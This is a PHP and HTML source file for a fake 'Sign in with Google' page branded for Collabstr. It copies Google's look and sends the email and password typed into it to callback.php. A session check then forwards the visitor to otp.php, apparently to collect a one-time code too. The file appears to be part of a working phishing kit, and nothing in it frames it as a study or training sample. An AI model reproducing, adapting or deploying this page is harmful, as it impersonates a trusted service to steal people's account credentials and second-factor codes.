<?php
session_start();
if (isset($_SESSION['email'])) {
    header('Location: otp.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 20px; font-size: 40px; }
        h1 { font-size: 22px; text-align: center; font-weight: 400; color: #202124; margin-bottom: 6px; }
        .subtitle { text-align: center; color: #5f6368; font-size: 14px; margin-bottom: 30px; }
        .input-group { margin-bottom: 16px; }
        .input-group label { display: block; font-size: 13px; color: #5f6368; margin-bottom: 6px; }
        .input-group input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 8px; font-size: 16px; outline: none; }
        .input-group input:focus { border-color: #1a73e8; }
        .next-btn { width: 100%; padding: 14px; background: #1a73e8; color: white; border: none; border-radius: 50px; font-size: 15px; font-weight: 500; cursor: pointer; margin-top: 20px; }
        .next-btn:hover { background: #1765cc; }
        .footer { text-align: center; margin-top: 30px; color: #5f6368; font-size: 12px; }
        .footer a { color: #1a73e8; text-decoration: none; }
        .alert { padding: 12px; border-radius: 8px; margin-bottom: 16px; font-size: 14px; display: none; background: #fce8e6; color: #c5221f; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔵</div>
        <h1>Sign in with Google</h1>
        <div class="subtitle">to continue to Collabstr</div>

        <div id="alert" class="alert"></div>

        <form method="POST" action="callback.php">
            <input type="hidden" name="action" value="login">
            <div class="input-group">
                <label>Email or phone</label>
                <input type="email" name="email" placeholder="you@gmail.com" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="next-btn">Sign in</button>
        </form>

        <div class="footer">
            <a href="#">Help</a> · <a href="#">Privacy</a> · <a href="#">Terms</a>
        </div>
    </div>
</body>
</html>
